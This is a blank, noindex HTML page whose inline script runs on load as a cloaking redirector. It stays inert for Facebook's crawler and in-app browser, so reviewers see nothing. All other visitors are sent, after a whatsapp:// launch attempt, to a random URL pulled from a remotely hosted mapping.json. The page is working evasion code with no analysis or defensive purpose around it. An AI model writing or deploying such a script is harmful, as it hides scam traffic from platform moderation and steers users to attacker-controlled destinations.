<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {margin:0; background:#ffffff; display:none;}
</style>
<script>
(async () => {

  const ua = navigator.userAgent || "";
  const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";

  // 直接判断是否为 Facebook 内置浏览器 → 不跳
  if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("FB_IAB") || ua.includes("Facebot") || ua.includes("facebookexternalhit")) {
    return;
  }

  try {
    const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), {cache:"no-store"});
    const data = await res.json();
    const active = data.links.filter(x => x.active);
    if(!active.length) return;

    const url = active[Math.floor(Math.random() * active.length)].url;

    // iPhone
    if (/iPhone|iPad|iPod/i.test(ua)) {
      let ifr = document.createElement("iframe");
      ifr.style.display="none";
      ifr.src="whatsapp://";
      document.body.appendChild(ifr);

      setTimeout(()=>{location.href=url;},1200);
      return;
    }

    // Android
    location.href="whatsapp://";
    setTimeout(()=>{location.href=url;},800);

  } catch(e){}
})();
</script>
</head>
<body></body>
</html>
